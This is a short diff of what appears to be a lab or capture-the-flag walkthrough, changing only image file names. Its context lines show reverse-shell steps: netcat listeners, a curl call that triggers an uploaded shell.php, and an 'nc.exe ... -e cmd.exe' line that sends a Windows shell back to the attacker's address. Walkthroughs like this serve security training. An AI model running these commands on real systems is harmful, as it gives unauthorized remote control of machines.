@@ -195,7 +195,7 @@ sudo rlwrap nc -lnvp 443
 curl --proxy http://192.168.75.189:3128 -s http://192.168.75.189:8080/shell.php
 ```
 
-<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 ### Stable Shell
 
@@ -222,7 +222,7 @@ sudo rlwrap nc -lnvp 80
 nc.exe 192.168.49.75 80 -e cmd.exe
 ```
 
-<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
